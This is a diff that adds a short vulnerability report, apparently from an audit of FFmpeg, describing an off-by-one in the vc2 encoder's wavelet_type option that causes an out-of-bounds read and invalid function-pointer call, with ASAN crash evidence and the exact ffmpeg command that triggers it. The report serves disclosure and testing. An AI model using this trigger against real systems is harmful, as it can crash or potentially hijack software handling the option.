@@ -1,0 +1,9 @@
+## Summary
+
+| VULN | Title | Status |
+|------|-------|--------|
+| 001 | vc2enc AVOption off-by-one — OOB read + invalid function-pointer call via `wavelet_type=7` | **VERIFIED_CRASH** |
+
+**Crash evidence**: ASAN reported `SEGV on unknown address` with `PC is at a non-executable region. Maybe a wild jump?` — the program counter jumped to the garbage value read from `vc2_subband_dwt[7]` (one past the end of the 7-element array), confirming the invalid function-pointer call described in the audit report.
+
+**Trigger**: `ffmpeg -f rawvideo -pixel_format yuv420p -video_size 128x128 -framerate 25 -i vuln_001_input.yuv -c:v vc2 -wavelet_type 7 -f null -`
